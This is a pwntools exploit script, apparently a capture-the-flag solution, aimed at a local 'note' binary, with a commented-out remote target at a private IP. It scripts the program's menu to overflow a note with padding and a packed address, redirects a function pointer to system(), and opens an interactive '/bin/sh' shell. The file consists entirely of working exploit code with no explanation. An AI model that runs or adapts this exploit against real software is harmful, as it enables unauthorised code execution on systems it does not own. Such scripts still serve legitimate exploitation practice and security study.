from pwn import *

call_puts = 0x0000000000602100
name_addr = 0x0000000000602120
system_addr = 0x0000000000400860

def launch_gdb():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    gdb.attach(proc.pidof(p)[0])

def add_note(title, size, content):
    p.sendline('1')
    p.sendline(size)
    p.sendline(content)
    p.sendline(title)

def edit_note(title, content):
    p.sendline('2')
    p.sendline(title)
    p.sendline(content)

def copy_note(title, times):
    p.sendline('5')
    p.sendline(title)
    p.sendline(times)

def show_note(title):
    p.sendline('3')
    p.sendline(title)


p = process('./note')
#p = remote('172.16.2.12', 20000)

p.sendline('ETenal')
add_note('/bin/sh', '30', 'OMG')
add_note('title', '30', 'OMG')
edit_note('title', '2333')
copy_note('title', '2')
#launch_gdb()
edit_note('CCCCCC', 'A'*24+p64(call_puts))
edit_note('CCCCCC','title')
edit_note('title', p64(system_addr))
show_note('/bin/sh')
p.interactive()